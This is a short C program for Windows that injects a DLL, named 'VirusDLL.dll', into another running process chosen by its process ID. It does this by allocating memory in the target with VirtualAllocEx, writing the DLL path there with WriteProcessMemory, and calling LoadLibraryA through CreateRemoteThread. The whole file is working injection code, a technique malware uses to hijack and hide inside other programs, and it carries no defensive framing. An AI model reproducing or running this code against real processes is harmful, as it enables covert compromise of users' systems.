
#include <Windows.h>
#include <winerror.h>

#include <stdio.h>

int main(int argc, char* argv[])
{
    char szDLLPathToInject[] = { "VirusDLL.dll" };
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // including NULL character.

    // 0. Open The process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, atoi(argv[1]));

    // 1. Alocate heap memory in remote process
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);

    // 2. Write the DLL path in the remote alocated heap memory.
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // 3.0. Get the starting address of the function LoadLibrary which is available in kernal32.dll
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");

    // 3.1. Call LoadLibraryin remote process and pass the remote heap memory which contains the dll path to load.
    CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    CloseHandle(hProcess);
    return 0;
}